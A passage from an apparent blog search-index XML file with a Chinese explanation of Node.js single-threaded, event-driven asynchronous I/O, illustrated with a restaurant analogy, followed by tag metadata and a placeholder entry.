<p>肯定不行！， 因为Node.js执行”后厨处理()”函数时，只是安插了一个匿名的回调函数在那里，并不会等待（非阻塞I/O），反而马上 会执行“客人吃饭()”函数，所以上述的写法会引起逻辑上的错误:还没上菜就开始吃饭了！<br>所以写惯了”顺序阻塞I/O“的我们需要改变一下思维方式，进入到事件驱动的世界中来。</p>
<p>如果某个操作例如“上菜处理” 是个CPU密集型的计算任务，Node.js那个唯一的线程就会忙于执行这个计算任务而被阻塞住，就无法响应其他的请求了，带来的后果很严重，整个服务器都无法响应了！  这个时候，需要考虑把这样的代码进行异步处理，也变成node.js所擅长的事件驱动的方式。</p>
]]></content>
        
        <categories>
            
            <category> web开发 </category>
            
            <category> NodeJS </category>
            
        </categories>
        
        
        <tags>
            
            <tag> NodeJS </tag>
            
            <tag> 单线程 </tag>
            
            <tag> 异步IO </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[关于NodeJS的单线程和异步IO]]></title>
        <url>https://517736522.github.io/2017/01/21/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/1asdas/</url>
        <content type="html"><![CDATA[<p>sdsdsd</p>
]]></content>
        
        <categories>
            
            <category> web开发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> NodeJS </tag>
            
            <tag> 单线程 </tag>
            
            <tag> 异步IO </tag>
            
        </tags>
        
    </entry>
    
    
    
    
    
</search>
